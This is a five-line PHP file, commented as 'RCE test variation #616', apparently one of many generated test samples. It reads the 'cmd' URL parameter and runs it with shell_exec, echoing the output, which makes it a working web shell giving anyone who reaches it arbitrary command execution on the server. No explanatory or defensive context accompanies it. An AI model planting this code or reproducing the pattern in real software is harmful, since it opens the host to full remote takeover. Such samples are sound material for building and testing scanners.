<?php
// RCE test variation #616
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>